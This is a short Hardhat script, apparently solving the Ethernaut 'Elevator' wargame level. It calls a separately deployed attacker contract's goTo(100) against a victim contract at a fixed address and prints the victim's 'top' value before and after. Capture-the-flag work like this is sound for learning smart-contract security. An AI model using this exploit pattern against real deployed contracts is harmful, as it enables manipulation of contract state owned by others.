import { network } from "hardhat";

const { ethers } = await network.create();

const VICTIM_ADDRESS = "0x091eD74FCf09843d66Eef7Dd5c5BBC12a19E266C";
const ATTACKER_ADDRESS = "0x83Be9feEA42E1E2376B5d742be0B76304A3e64C9";

const VICTIM_ABI = [
  "function top() view returns (uint256)",
  "function goTo(uint256 _floor) external",
];

const [signer] = await ethers.getSigners();
const attacker = await ethers.getContractAt("Elevator", ATTACKER_ADDRESS, signer);


const victim = await ethers.getContractAt(VICTIM_ABI, VICTIM_ADDRESS);


async function main() {

  console.log("Top before:", await victim.top());

  // Attack — on envoie la tx directement sans simulation préalable
  const tx = await attacker.goTo(100);
  await tx.wait();

  console.log("Top after:", await victim.top());
}

main().catch(console.error);
